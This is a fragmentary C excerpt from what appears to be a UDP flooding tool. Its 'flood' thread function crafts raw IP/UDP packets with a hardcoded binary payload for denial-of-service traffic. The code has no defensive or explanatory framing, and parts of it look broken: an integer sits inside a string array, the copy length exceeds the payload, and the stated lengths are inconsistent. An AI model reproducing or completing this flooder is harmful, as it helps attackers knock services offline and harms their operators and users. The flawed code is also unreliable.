...
void *flood(void *par1)
{
		...
		char *hexa[] = {"\x89","\x08","\x00","\x50","\x00","\x33","\x00","\x00","\x90","\x78","\xA7","\x62","\xDB","\x58","\xAA","\x1A","\x00","\x09","\x58","\x3A","\xBE","\xDE","\x00","\x01","\x46","\x9D","\xC2","\x8E","\xE8","\xCF","\x0E","\x1E","\x1F","\xD6","\x1E","\xAD","\xBB","\xAF","\xFF","\xD5","\xAC","\x05","\x76","\xC8","\xEA","\x77","\xDF","\x00","\x00","\x00","\x00", 100};
				...
				memcpy((void *)udph + sizeof(struct udphdr), "\x89\x08\x00\x50\x00\x33\x00\x00\x90\x78\xA7\x62\xDB\x58\xAA\x1A\x00\x09\x58\x3A\xBE\xDE\x00\x01\x46\x9D\xC2\x8E\xE8\xCF\x0E\x1E\x1F\xD6\x1E\xAD\xBB\xAF\xFF\xD5\xAC\x05\x76\xC8\xEA\x77\xDF\x00\x00\x00\x00", 100);
				udph->len=htons(sizeof(struct udphdr) + 43);
				
				iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 43;
				iph->check = csum ((unsigned short *) datagram, iph->tot_len);
